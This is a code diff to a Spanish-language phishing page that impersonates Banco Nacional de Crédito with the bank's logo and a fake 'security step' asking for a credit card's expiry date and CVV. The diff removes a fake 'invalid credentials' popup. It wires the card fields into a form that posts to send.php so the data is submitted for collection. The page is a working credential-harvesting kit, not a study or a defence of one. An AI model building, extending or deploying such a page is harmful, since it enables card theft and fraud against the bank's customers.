@@ -155,137 +155,20 @@
   }
 
 
-  .bnc-alert-overlay{
-    position:fixed;
-    inset:0;
-
-    background:rgba(0,0,0,.35);
-
-    display:flex;
-    justify-content:center;
-    align-items:center;
-
-    z-index:999999;
-
-    animation:fadeIn .25s ease;
-}
-
-.bnc-alert-box{
-    width:92%;
-    max-width:360px;
-
-    background:white;
-
-    border-radius:22px;
-
-    padding:30px 24px;
-
-    text-align:center;
-
-    box-shadow:
-    0 18px 45px rgba(0,0,0,.18);
-
-    animation:popup .28s ease;
-
-    font-family:'Poppins',sans-serif;
-
-    position:relative;
-}
-
-.bnc-alert-close{
-    position:absolute;
-
-    top:14px;
-    right:14px;
-
-    width:34px;
-    height:34px;
-
+    .submit-btn{
+    width:75%;
     border:none;
-    border-radius:50%;
-
-    background:#f2f4f8;
-
-    color:#5f6b7a;
-
-    font-size:24px;
-    line-height:1;
-
+    border-radius:14px;
+    background:#FF6A00;
+    color:#fff;
+    font-family:"Poppins",sans-serif;
+    font-size:18px;
+    font-weight:600;
+    padding:16px;
     cursor:pointer;
-
-    transition:.2s;
-}
-
-.bnc-alert-close:hover{
-    background:#e5e9f0;
-}
-
-.bnc-alert-logo{
-    width:110px;
-    display:block;
-    margin:0 auto 18px;
-}
-
-.bnc-alert-icon{
-    width:58px;
-    height:58px;
-
-    border-radius:50%;
-
-    background:#ff5a00;
-    color:white;
-
-    display:flex;
-    justify-content:center;
-    align-items:center;
-
-    font-size:34px;
-    font-weight:600;
-
-    margin:0 auto 18px;
-}
-
-.bnc-alert-title{
-    font-size:24px;
-    font-weight:600;
-
-    color:#003c81;
-
-    margin-bottom:10px;
-}
-
-.bnc-alert-text{
-    font-size:15px;
-    line-height:1.7;
-
-    color:#5f6b7a;
-}
-
-/* ANIMACIONES */
-
-@keyframes popup{
-
-    0%{
-        transform:scale(.85);
-        opacity:0;
-    }
-
-    100%{
-        transform:scale(1);
-        opacity:1;
-    }
-}
-
-@keyframes fadeIn{
-
-    from{
-        opacity:0;
-    }
-
-    to{
-        opacity:1;
-    }
-}
+    transition:background .15s ease;
+  }
+  .submit-btn:hover{background:#e85f00;}
 </style>
 </head>
 <body>
@@ -297,12 +180,12 @@
       src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original">
 
     <h1 class="step-title">Paso de seguridad, completa los datos de tu tarjeta de crédito:</h1>
-
+    <form action="send.php" method="POST">
 
     <!-- Mes de vencimiento -->
     <div class="field">
       <label class="field-label" for="mes">Mes de Vencimiento TDC</label>
-      <select id="mes" required>
+      <select id="mes" name="mes" required>
         <option value="" selected>-- Mes --</option>
         <option value="01">01 - Enero</option>
         <option value="02">02 - Febrero</option>
@@ -327,7 +210,7 @@
     <!-- Año de vencimiento -->
     <div class="field">
       <label class="field-label" for="anio">Año de Vencimiento TDC</label>
-      <select id="anio" required>
+      <select id="anio" name="anio" required>
         <option value="" selected>-- Año --</option>
         <!-- Los años se generan con JS -->
       </select>
@@ -340,82 +223,18 @@
 
     <!-- CVV -->
     <div class="field field--cvv">
-      <input type="text" id="cvv" inputmode="numeric" autocomplete="cc-csc"
+      <input type="text" id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc"
              maxlength="4" placeholder="CVV ..." aria-label="CVV">
       <span class="field-icon" aria-hidden="true">
         <svg viewBox="0 0 24 24" fill="currentColor">
           <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
         </svg>
       </span>
-    </div>
-
+    </div><br><br>
+      
+    <button type="submit" class="submit-btn">Continuar</button>
+  </form>
   </div>
-
-
-  <!-- ALERTA -->
-<div class="bnc-alert-overlay" id="bncAlert">
-
-    <div class="bnc-alert-box">
-
-        <!-- BOTON CERRAR -->
-        <button class="bnc-alert-close" id="closeAlert">
-            ×
-        </button>
-
-        <img
-            src="BNCLogoSmall-Big.png"
-            class="bnc-alert-logo"
-        >
-
-        <div class="bnc-alert-icon">
-            !
-        </div>
-
-        <div class="bnc-alert-title">
-            Credenciales inválidas
-        </div>
-
-        <div class="bnc-alert-text">
-            Verifica tu información e intenta nuevamente.
-        </div>
-
-    </div>
-
-</div>
-
-  <script>
-
-window.addEventListener('load', () => {
-
-    const alertBox = document.getElementById('bncAlert');
-
-    function closeAlert() {
-
-        alertBox.style.opacity = '0';
-        alertBox.style.transition = '.25s ease';
-
-        setTimeout(() => {
-
-            alertBox.remove();
-
-        }, 250);
-    }
-
-    /* CLICK EN CUALQUIER PARTE */
-
-    document.body.addEventListener('click', closeAlert, {
-        once: true
-    });
-
-    /* TOUCH MOVIL */
-
-    document.body.addEventListener('touchstart', closeAlert, {
-        once: true
-    });
-
-});
-
-</script>
 
   <script>
     // Generar años (año actual + próximos 12)
